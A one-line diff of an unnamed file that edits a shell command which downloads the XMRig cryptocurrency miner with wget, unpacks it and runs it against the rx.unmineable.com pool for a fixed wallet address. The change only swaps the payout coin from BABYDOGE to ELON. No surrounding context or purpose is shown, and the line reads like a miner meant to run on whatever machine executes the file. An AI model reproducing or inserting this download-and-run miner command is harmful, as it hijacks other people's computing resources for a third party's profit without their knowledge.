@@ -1,1 +1,1 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-static-x64.tar.gz && tar -xvf xmrig-6.18.0-linux-static-x64.tar.gz && cd xmrig-6.18.0 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u BABYDOGE:0x78c51a412C797FB1A1c3af91bA00ecA24E7efA97.qwik1 -p x
+wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-static-x64.tar.gz && tar -xvf xmrig-6.18.0-linux-static-x64.tar.gz && cd xmrig-6.18.0 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u ELON:0x78c51a412C797FB1A1c3af91bA00ecA24E7efA97.qwik1 -p x
